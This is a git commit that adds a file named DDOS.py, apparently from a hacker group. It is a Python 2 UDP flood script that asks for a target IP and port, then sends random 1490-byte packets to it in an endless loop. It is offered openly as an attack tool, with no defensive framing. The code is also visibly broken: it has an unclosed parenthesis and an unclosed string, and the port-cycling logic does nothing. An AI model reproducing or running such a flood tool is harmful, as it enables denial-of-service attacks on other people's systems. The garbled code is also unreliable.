b15f1079ef28688dfa8929d2193dcf5f7d78ac93
victor0901 <45844414+victor0901@users.noreply.github.com>
2018-12-13 22:13:42 +0900

    Add files via upload

---
+++ DDOS.py
@@ -0,0 +1,39 @@
+
+import sys
+import os
+import time
+import socket
+import random
+#Perlengkapan Tempur :v
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear") 
+os.system("figlet THT"
+print
+print "Creator   : USER003F"
+print "Team.     : Tengkorak Hacker Team (THT) 
+print
+ip = raw_input("Masukkan IP Target : ")
+port = input("Masukkan Port      : ")
+
+os.system("clear")
+os.system("figlet Dimulai")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip, port))
+     sent = sent + 1
+     port = port + 0
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 0
